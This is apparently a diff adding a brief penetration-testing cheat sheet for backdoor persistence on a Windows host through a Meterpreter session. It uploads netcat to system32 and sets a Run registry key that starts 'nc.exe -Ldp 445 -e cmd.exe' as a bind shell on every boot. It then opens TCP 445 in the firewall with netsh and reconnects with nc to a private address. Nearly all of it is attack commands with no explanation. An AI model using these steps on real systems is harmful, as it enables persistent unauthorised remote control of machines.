@@ -1,0 +1,31 @@
+
+Meterpreter Shell IP : 172.16.X.X
+
+meterpreter > upload /pentest/windows-binaries/tools/nc.exe C:\\windows\\system32
+
+
+meterpreter > enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+
+
+meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
+
+
+meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+
+
+meterpreter > execute -f cmd -i
+
+Than Connected cmd.exe
+======================
+
+netsh firewall show opmode
+
+netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
+
+netsh firewall show portopening
+
+
+Close Connection and Connect To Remote Server
+==============================================
+
+nc -v 172.16.104.128 445
